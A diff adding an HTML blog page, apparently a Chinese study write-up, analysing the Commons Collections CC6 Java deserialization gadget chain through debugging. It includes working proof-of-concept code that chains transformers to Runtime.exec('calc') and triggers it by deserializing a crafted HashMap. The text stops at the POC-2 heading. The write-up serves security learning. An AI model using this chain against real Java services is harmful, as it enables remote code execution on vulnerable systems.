@@ -1,0 +1,722 @@
+<!DOCTYPE html>
+<html lang="zh-CN" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="" />
+  <meta name="author" content="Okaytc" />
+  <meta name="description" content="生活 健身 学习 沉淀" />
+  
+  
+  <title>
+    
+      java安全-CC6链学习与分析 
+      
+      
+      |
+    
+     Okaytc
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/head.jpg">
+    <link rel="icon" href="/images/head.jpg">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+    
+<link rel="stylesheet" href="/css/figcaption/mac-block.css">
+
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/head.jpg" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">Okaytc</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">主页</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">文章</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">标签</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">友链</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">关于</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">java安全-CC6链学习与分析</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+          2022-12-16 18:16:00
+        </span>
+        
+              <span class="post-tags">
+                <i class="iconfont icon-tags mr-10" title="标签"></i>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/Java%E5%AE%89%E5%85%A8/" title="Java安全">
+                    #Java安全
+                  </a>
+                </span>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/java%E5%88%A9%E7%94%A8%E9%93%BE/" title="java利用链">
+                    #java利用链
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h1 id="0x00、前言"><a href="#0x00、前言" class="headerlink" title="0x00、前言"></a>0x00、前言</h1><p>CC6也是在CC5的基础上，改变了入口，依旧单独列出来方便整理，写一起太乱了。</p>
+<h1 id="0x01、Apache-Commons-Collections描述"><a href="#0x01、Apache-Commons-Collections描述" class="headerlink" title="0x01、Apache Commons Collections描述"></a>0x01、Apache Commons Collections描述</h1><p>引用CC1链分析中的描述<br>CC链即Commons Collections利用链，主要针对Commons Collections组件发现的利用链。</p>
+<blockquote>
+<p>Apache Commons是Apache软件基金会的项目。Commons的目的是提供可重用的、开源的Java代码。<br>Apache Commons提供了很多工具类库，他们几乎不依赖其他第三方的类库，接口稳定，集成简单，可以大大提高编码效率和代码质量。<br>Apache Commons Collections 是对 java.util.Collection 的扩展。<br>Commons Collections包为Java标准的Collections API提供了相当好的补充。在此基础上对其常用的数据结构操作进行了很好的封装、抽象和补充。让我们在开发应用程序的过程中，既保证了性能，同时也能大大简化代码。</p>
+</blockquote>
+<p>目前 Collections 包有两个 commons-collections 和commons-collections4，commons-collections 最新版本是3.2.2，3系列版本也是只有3.2.2是安全的，不支持泛型，目前官方已不在维护。collections4 目前最新版本是4.4，其中4.0是存在漏洞，最低要求 Java8 以上。相对于 collections 来说完全支持 Java8 的特性并且支持泛型，该版本无法兼容旧有版本，于是为了避免冲突改名为 collections4。推荐直接使用该版本。（注：两个版本可以共存，使用时需要注意）</p>
+<h1 id="0x02、环境准备"><a href="#0x02、环境准备" class="headerlink" title="0x02、环境准备"></a>0x02、环境准备</h1><p>java版本：jdk8u66（版本无限制）<br>Commons Collections：3.2.1（漏洞版本在3.1-3.2.1）<br>maven项目pom.xml文件中添加依赖</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;<span class="number">3.2</span><span class="number">.1</span>&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure>
+<p>在idea访问<code>Commons Collections</code>组件的文件时候点击上方的下载源代码就可以看到对应文件的.java文件了</p>
+<h1 id="0x03、分析"><a href="#0x03、分析" class="headerlink" title="0x03、分析"></a>0x03、分析</h1><p>CC6基于CC5的变式，改变了触发入口点，简述CC5的触发过程</p>
+<h2 id="回顾CC5链"><a href="#回顾CC5链" class="headerlink" title="回顾CC5链"></a>回顾CC5链</h2><ul>
+<li>生成<code>LazyMap</code>对象，将<code>InvokerTransformer</code>利用方法串起来的<code>ChainedTransformer</code>对象传入<code>LazyMap</code>构造方法。</li>
+<li>将<code>LazyMap</code>对象传入<code>TiedMapEntry</code>类构造方法，通过<code>TiedMapEntry.getValue()</code>方法调用<code>lazyMap.get()</code>方法。</li>
+<li>将<code>TiedMapEntry</code>对象通过反射赋值给<code>BadAttributeValueExpException</code>类的<code>val</code>值，通过反序列化<code>BadAttributeValueExpException</code>类对象，调用重写<code>readObject</code>方法中的<code>val.toString()</code>。</li>
+<li><code>val.toString()</code>调用等效于<code>TiedMapEntry.toString()</code>，即调用<code>TiedMapEntry.getValue()</code>方法，达到调用<code>lazyMap.get()</code>方法触发代码执行。</li>
+</ul>
+<h2 id="CC6链分析"><a href="#CC6链分析" class="headerlink" title="CC6链分析"></a>CC6链分析</h2><p>在CC5中提到，调用<code>LazyMap.get()</code>方法，找到的新的入口<code>TiedMapEntry.getValue()</code>中调用的<code>get()</code>方法</p>
+<p><img src="/posts/9758c0a8/cc6-1.png" title="TiedMapEntry.getValue()"></p>
+<p>然后顺势寻找<code>getValue()</code>的调用情况，<code>TiedMapEntry</code>本类中有三个方法进行了调用</p>
+<p><img src="/posts/9758c0a8/cc6-2.png" title="调用情况"></p>
+<p>其中CC5就是<code>BadAttributeValueExpException</code>类调用了<code>toString()</code>方法形成的新入口。</p>
+<p>除了<code>toString()</code>方法外，还有<code>hashCode()</code>和<code>equals()</code>，<code>hashCode()</code>能联想到<code>HashMap</code>，在学CC5的时候看到这三个方法我以为就是利用<code>hashCode()</code>，结果是<code>toString()</code>的调用链。</p>
+<h3 id="实现思路一：HashMap"><a href="#实现思路一：HashMap" class="headerlink" title="实现思路一：HashMap"></a>实现思路一：HashMap</h3><p>继续看<code>hashCode()</code>的调用联想到的<code>HashMap</code>。</p>
+<p><img src="/posts/9758c0a8/cc6-3.png" title="put值"></p>
+<p><code>HashMap</code>在<code>put</code>值时，会对<code>key</code>进行<code>hash</code>操作，会调用<code>hash()</code>，其中<code>hash()</code>方法调用<code>key</code>参数的<code>hashCode()</code>方法，且key参数是可控的，为了调用<code>TiedMapEntry.hashCode()</code>，只需要将<code>TiedMapEntry</code>对象作为key传入<code>hash(Object key)</code>方法中，便能调用<code>TiedMapEntry.hashCode()</code>，达到执行代码的目的。</p>
+<p><img src="/posts/9758c0a8/cc6-3.png" title="hash()"><br><img src="/posts/9758c0a8/cc6-4.png" title="执行效果"></p>
+<p>执行效果：</p>
+<p><img src="/posts/9758c0a8/cc6-5.png" title="hashCode()"></p>
+<p>这时候就能触发代码执行了，开始想的<code>hashmap</code>也可以直接序列化，为啥就不直接把<code>hashmap</code>对象给序列化，虽然在本地会触发一次代码执行，但也算是个利用链，但在序列化和反序列化的过程发现都存在问题</p>
+<p><img src="/posts/9758c0a8/cc6-6.png" title="报错"></p>
+<h4 id="报错排查"><a href="#报错排查" class="headerlink" title="报错排查"></a>报错排查</h4><p>序列化过程报错<code>java.lang.ProcessImpl</code>，该对象无法序列化导出抛出异常，开始想半天也不知道这个对象是哪来的，随后进行序列化调试<br>因为是对<code>hashmap</code>对象进行的序列化，且<code>hashmap</code>重写了序列化和反序列化过程，所以直接断点重写的序列化步骤就行</p>
+<p><img src="/posts/9758c0a8/cc6-7.png" title="断点"></p>
+<p><code>hashmap</code>的序列化写入显示经过<code>defaultWriteObject()</code>默认的序列化写入，然后还会经过<code>internalWriteEntries()</code>序列化检查，通过断点下来给我感觉作用就是把<code>hashmap</code>放入<code>table</code>中对每个<code>Key-value</code>进行序列化写入，然后遍历每个map的元素依次序列化调用<code>defaultWriteObject()</code>方法</p>
+<p>直接进<code>internalWriteEntries()</code>方法查看<code>Map</code>对象的情况，此时<code>table</code>中只有一个<code>key=TiedMapEntry</code>对象，该对象为我们<code>put</code>进的对象，</p>
+<p><img src="/posts/9758c0a8/cc6-8.png" title="TM对象"></p>
+<p>读取到<code>table</code>对象元素后进行<code>writeObject</code>写入，并判断元素类型，进入对应的序列化步骤</p>
+<p><img src="/posts/9758c0a8/cc6-9.png" title="元素对象判断"></p>
+<p>随后在序列化读取数据的，发现此时还存在另外一个<code>Key</code>元素，<code>key</code>值是<code>11</code>，也就是说<code>hashmap</code>的另外一个<code>map</code>中还存在一对键值对，<code>key</code>值为<code>11</code></p>
+<p><img src="/posts/9758c0a8/cc6-10.png" title="map元素"></p>
+<p>随后遍历到<code>key</code>值为<code>11</code>的元素后 会再次序列化，重复重写的<code>writeObject()</code>步骤去写入另一个<code>map</code>中元素</p>
+<p><img src="/posts/9758c0a8/cc6-11.png" title="map元素"></p>
+<p>此时序列化<code>table</code>内容就变为另外一个<code>map</code>的元素内容：<code>key</code>为<code>11</code>，<code>value</code>为<code>ProcessImpl</code>对象，随后再对<code>value</code>进行序列化写入的时候，由于<code>ProcessImpl</code>对象不可被序列化，导致抛出异常</p>
+<p>序列化报错的原因找到了，现在就是找到为啥会多出来添加一组元素的<code>map</code>对象</p>
+<p>由于序列化操作是已经对代码进行了编译，也就是说前面的代码已经被执行过了然后再对<code>hashmap</code>对象进行序列化，在序列化前<code>hashmap</code>的存在两个<code>map</code>，其中分别存在1组元素</p>
+<p>回到<code>LazyMap.get()</code>这个触发点，在本地put值时会触发一次代码执行，此时的运行步骤</p>
+<p><img src="/posts/9758c0a8/cc6-12.png" title="LazyMap.get()"></p>
+<p>可以看到当前的<code>key</code>为<code>11</code>，为<code>TiedMapEntry</code>对象创建时传入构造方法的<code>key</code>值，会判断<code>map</code>中是否存在<code>key</code>为<code>11</code>的元素，当前由于<code>map</code>只有一个<code>TiedMapEntry</code>对象的<code>key</code>元素，不存在<code>key</code>为<code>11</code>的元素，因此会进入判断体，执行<code>factory.transform(key)</code>触发了代码执行，随后将返回来的值<code>ProcessImpl</code>对象赋值给<code>value</code>变量，然后进行<code>map.put(key，value)</code>，此时<code>key</code>为<code>11</code>，<code>value</code>为<code>TiedMapEntry</code>，因此当前<code>map</code>对象中会多出一组元素，导致序列化报错。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">TiedMapEntry TM=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(Lmap,<span class="number">11</span>);</span><br><span class="line">hm.put(TM,<span class="number">111</span>);</span><br></pre></td></tr></table></figure>
+
+<p>同时由于本地触发了漏洞，添加了<code>map</code>元素，导致反序列化时，<code>map</code>中已经存在<code>Key</code>为<code>11</code>的元素，因此不会进入判断体，不会触发代码执行。</p>
+<h4 id="解决序列化问题"><a href="#解决序列化问题" class="headerlink" title="解决序列化问题"></a>解决序列化问题</h4><p>因此需要将新多出来的<code>map</code>元素进行删除，对象为<code>LazyMap.decorate(map,transformerChain)</code>传递进的<code>map</code>对象</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="comment">//创建LazyMap对象调用decorate回调方法</span></span><br><span class="line">Map Lmap= LazyMap.decorate(map,transformerChain);</span><br><span class="line">Map hm=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">TiedMapEntry TM=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(Lmap,<span class="number">11</span>);</span><br><span class="line">hm.put(TM,<span class="number">111</span>);</span><br><span class="line"><span class="comment">//删除map对象的新增的元素，避免序列化出错以及触发点失效</span></span><br><span class="line">map.remove(<span class="number">11</span>);</span><br></pre></td></tr></table></figure>
+
+<p>此时序列化就不会再报错，同时反序列化也能触发漏洞。</p>
+<p><img src="/posts/9758c0a8/cc6-13.png" title="解决序列化问题"></p>
+<h4 id="解决本地触发问题"><a href="#解决本地触发问题" class="headerlink" title="解决本地触发问题"></a>解决本地触发问题</h4><p>解决本地触发，可以直接把触发点制空，在put完元素后，再通过反射把触发点设置给<code>Lazymap</code>，实现方法很多，原理都是一样的，都时是通过在put值时不触发<code>Runtime.exec()</code>就行，可以先制空或者填加一个正常的<code>ConstantTransformer</code>方法都可以。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="comment">//获取Runtime类对象</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">        <span class="comment">//反射调用getMethod方法，获取Runtime类的getRuntime方法，返回Runtime.getRuntime()方法，此时并未执行该方法，因此并未实例化</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">        <span class="comment">//反射调用invoke方法，执行Runtime.getRuntime()方法，实现Runtime对象的实例化并返回Runtime对象</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">        <span class="comment">//反射调用exec方法，并执行该方法</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//创建一个空的链转换器</span></span><br><span class="line">Transformer[] transformersfake = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;&#125;;</span><br><span class="line"><span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line"><span class="type">Transformer</span> <span class="variable">transformerChainfake</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformersfake);</span><br><span class="line"><span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line"><span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"><span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="comment">//创建LazyMap对象调用decorate回调方法</span></span><br><span class="line">Map Lmap= LazyMap.decorate(map,transformerChainfake);</span><br><span class="line">Map hm=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">TiedMapEntry TM=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(Lmap,<span class="number">11</span>);</span><br><span class="line">hm.put(TM,<span class="number">111</span>);</span><br><span class="line"><span class="comment">//删除map对象的新增的元素，避免序列化出错以及触发点失效</span></span><br><span class="line">map.remove(<span class="number">11</span>);</span><br><span class="line"><span class="comment">//通过反射将触发链转换器赋值给factory变量</span></span><br><span class="line">Field field=LazyMap.class.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">field.set(Lmap,transformerChain);</span><br></pre></td></tr></table></figure>
+
+<h4 id="POC-1"><a href="#POC-1" class="headerlink" title="POC-1"></a>POC-1</h4><p>解决了上面问题，再加上序列化和反序列化步骤就得到完整POC，这里也不再写构造POC过程了，根据分析就得到大部分步骤了组合起来就行。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="comment">//获取Runtime类对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">//反射调用getMethod方法，获取Runtime类的getRuntime方法，返回Runtime.getRuntime()方法，此时并未执行该方法，因此并未实例化</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用invoke方法，执行Runtime.getRuntime()方法，实现Runtime对象的实例化并返回Runtime对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用exec方法，并执行该方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//创建一个空的链转换器</span></span><br><span class="line">        Transformer[] transformersfake = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;&#125;;</span><br><span class="line">        <span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChainfake</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformersfake);</span><br><span class="line">        <span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="comment">//创建LazyMap对象调用decorate回调方法</span></span><br><span class="line">        Map Lmap= LazyMap.decorate(map,transformerChainfake);</span><br><span class="line">        Map hm=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        TiedMapEntry TM=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(Lmap,<span class="number">11</span>);</span><br><span class="line">        hm.put(TM,<span class="number">111</span>);</span><br><span class="line">        <span class="comment">//删除map对象的新增的元素，避免序列化出错以及触发点失效</span></span><br><span class="line">        map.remove(<span class="number">11</span>);</span><br><span class="line">        Field field=LazyMap.class.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(Lmap,transformerChain);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//最后生成序列化文件，反序列化实现命令执行</span></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;cc6payload.ser&quot;</span>));</span><br><span class="line">            outputStream.writeObject(hm);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;cc6payload.ser&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">            inputStream.close();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>实现效果：</p>
+<p><img src="/posts/9758c0a8/cc6-14.png" title="实现效果"></p>
+<h4 id="疑惑"><a href="#疑惑" class="headerlink" title="疑惑"></a>疑惑</h4><p>在上面的所有分析都基于 新建立了一个hashmap对象去put TiedMapEntry对象的分析，如下面的hm变量。开始没想那么多，单纯新建了一个hashmap对象想去触发漏洞，直到在学习分析思路二的时候，回过头看到代码，有个疑惑“为啥要多建立一个hashmap对象去触发，已经有一个hashmap对象了(如下面代码的map变量)，直接用map变量去put进TiedMapEntry对象不就行了”</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="comment">//创建LazyMap对象调用decorate回调方法</span></span><br><span class="line">Map Lmap= LazyMap.decorate(map,transformerChainfake);</span><br><span class="line">Map hm=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">TiedMapEntry TM=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(Lmap,<span class="number">11</span>);</span><br><span class="line">hm.put(TM,<span class="number">111</span>);</span><br><span class="line">map.remove(<span class="number">11</span>);</span><br></pre></td></tr></table></figure>
+
+<p>然后将代码改成下面过后，本以为效果还是一样的，但运行过后发现，如果不要<code>map.remove(11);</code>即不删除map中key为11的元素，依旧能反序列化触发漏洞，而上面分析中新建hashmap对象去put进TiedMapEntry对象的话，必须要删除第一个hashmap对象中的key为11元素才能触发。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="comment">//创建LazyMap对象调用decorate回调方法</span></span><br><span class="line">Map Lmap= LazyMap.decorate(map,transformerChainfake);</span><br><span class="line">TiedMapEntry TM=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(Lmap,<span class="number">11</span>);</span><br><span class="line">map.put(TM,<span class="number">111</span>);</span><br><span class="line"><span class="comment">//map.remove(11);</span></span><br></pre></td></tr></table></figure>
+
+<p>在调试过程中也发现运行完<code>map.put(TM,111);</code>后，也添加了key为11的元素，此时ma已经存在key为11的元素</p>
+<p><img src="/posts/9758c0a8/cc6-20.png" title="map元素"></p>
+<p>那在反序列化的时候，在触发漏洞点时不是应该<code>map.containsKey(key)</code>值为true吗，为什么实际运行结果是false然后触发漏洞</p>
+<p><img src="/posts/9758c0a8/cc6-21.png" title="判断条件"></p>
+<p>调试找下原因，<code>hashmap</code>重写了反序列化<code>readObject</code>，那在反序列化处打断点看看怎么读取数据的。<br><code>readObject</code>的前面部分代码就是获取一些序列化流的一些信息，然后在创建node节点，读取流中的map信息，依次把key和value进行put还原。<br>在关键读取map中下断点</p>
+<p><img src="/posts/9758c0a8/cc6-22.png" title="断点分析"></p>
+<p>可以看到第一个读取还原的<code>Map</code>元素，<code>key</code>为<code>TiedMapEntry</code>，<code>value</code>为<code>111</code></p>
+<p><img src="/posts/9758c0a8/cc6-23.png" title="第一次还原元素"></p>
+<p>读出来后，进行<code>putVal()</code>写入还原<code>hashmap</code>，其中会有<code>hash(key)</code>操作，跟进hash</p>
+<p><img src="/posts/9758c0a8/cc6-24.png" title="hash操作"></p>
+<p>然后调用到<code>hashCode()</code>,跟进<code>hashCode()</code>,调用<code>getValue()</code>,再跟进<code>getValue()</code>,进入到<code>get</code>方法中</p>
+<p><img src="/posts/9758c0a8/cc6-25.png" title="get方法"></p>
+<p>进入到判断体中，触发漏洞</p>
+<p><img src="/posts/9758c0a8/cc6-26.png" title="触发漏洞"></p>
+<p>可以看到当前的table表中没有任何元素，因此能进入判断体中触发漏洞，然后再Put添加元素</p>
+<p><img src="/posts/9758c0a8/cc6-27.png" title="table表"></p>
+<p>然后再跳过断点，回到主循环体，这时候读取第二组元素，此时的Key为11，然后再进行put操作</p>
+<p><img src="/posts/9758c0a8/cc6-28.png" title="读取第二组元素"></p>
+<p>至此，简述就是反序列化过程中，最先读取到<code>map</code>的<code>key</code>为<code>TiedMapEntry</code>的元素，然后进行<code>put</code>时由于<code>map</code>中没有存在<code>key</code>为<code>11</code>的元素，因此能够触发漏洞，触发完漏洞过后再还原写入<code>key</code>为<code>11</code>的元素。</p>
+<p>同hashmap对象操作能触发的原因找到了，再看看不同hashmap对象操作时，同样不删除key为11的元素，为什么就不行</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">Map hm=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="comment">//创建LazyMap对象调用decorate回调方法</span></span><br><span class="line">Map Lmap= LazyMap.decorate(map,transformerChainfake);</span><br><span class="line">TiedMapEntry TM=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(Lmap,<span class="number">11</span>);</span><br><span class="line">hm.put(TM,<span class="number">111</span>);</span><br></pre></td></tr></table></figure>
+
+<p>同样下断点，此时读取的元素&lt;key,value&gt;为(11,11)，不是上面情况的<code>key</code>为<code>TiedMapEntry</code>的元素，因此最开始就读取key为11的元素写入到map中，自然不会触发漏洞了</p>
+<p><img src="/posts/9758c0a8/cc6-29.png" title="读取元素"></p>
+<p>如果添加<code>map.remove(11);</code>删除key为11的步骤，在反序列化时读取的map元素就为<code>TiedMapEntry</code>元素，就能正常触发漏洞。</p>
+<p><img src="/posts/9758c0a8/cc6-30.png" title="读取元素"></p>
+<p>至此，原因找到了，但第二种情况为什么先还原的key为11，我的猜测：<br>第二种情况，由于第一个hashmap对象先创建，对第二个hashmap对象进行put操作，编译序列化写入的时候按顺序将第一个hashmap对象先写入此时已经将编译完成的值写入，导致在反序列化读取的时候第一个hashmap对象已经存在key为11的元素；而第一种情况，对同一个hashmap对象进行操作，顺序也是先Put进TiedMapEntry为Key，触发漏洞后，再创建put一个key为11的元素，所以序列化时第一个还原key为TiedMapEntry的map元素。</p>
+<h4 id="POC-2"><a href="#POC-2" class="headerlink" title="POC-2"></a>POC-2</h4><p>通过上面遇到的疑惑，同hashmap对象也能触发漏洞，就得到了第二个poc</p>
